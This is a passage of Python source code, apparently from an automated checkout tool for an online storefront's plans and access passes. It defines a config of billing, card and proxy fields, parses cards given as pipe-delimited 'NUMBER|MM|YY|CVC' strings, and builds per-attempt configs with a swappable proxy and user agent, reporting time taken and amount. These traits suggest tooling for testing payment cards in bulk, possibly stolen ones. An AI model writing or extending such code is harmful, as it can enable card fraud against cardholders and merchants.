        out["elapsed_ms"] = round((_t.time() - t0) * 1000)
        out["amount"] = self.cfg.get("amount", "?")
        out["currency"] = self.cfg.get("currency", "USD")
        return out

CONFIG = {
    "product_url":"","company_route":"","access_pass_route":"",
    "affiliate_tag":"","plan_id":"","access_pass_id":"","company_id":"",
    "email":"",
    "billing_name":"","billing_city":"","billing_country":"US",
    "billing_line1":"","billing_line2":"","billing_postal_code":"","billing_state":"",
    "card_number":"","card_exp_month":0,"card_exp_year":0,"card_cvc":"",
    "proxy":"","user_agent":"",
    "phone":"","discord":"","twitter":"","instagram":"","referral_code":"",
}

def _parse_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4:
        return None, "cc must be NUMBER|MM|YY|CVC"
    num = parts[0].replace(" ","").replace("-","")
    if not num.isdigit() or len(num) < 13:
        return None, "Invalid card number"
    mon = int(parts[1])
    if not (1 <= mon <= 12):
        return None, "Invalid month (1-12)"
    yr = int(parts[2]); yr = yr+2000 if yr < 100 else yr
    if yr < 2024:
        return None, "Card expired"
    return {"num":num,"mon":mon,"yr":yr,"cvc":parts[3]}, None

def _build_cfg(url, email, cc, proxy="", ua="", plan=""):
    return {
        **CONFIG,
        "product_url":    url,
        "email":          email,
        "card_number":    cc["num"],
        "card_exp_month": cc["mon"],
        "card_exp_year":  cc["yr"],
        "card_cvc":       cc["cvc"],
        "proxy":          proxy,
        "user_agent":     ua,
        "plan_id":        plan,
        "company_route":"","access_pass_route":"","affiliate_tag":"",
        "access_pass_id":"","company_id":"",
        "billing_name":"","billing_city":"","billing_line1":"",
        "billing_line2":"","billing_postal_code":"","billing_state":"",
    }
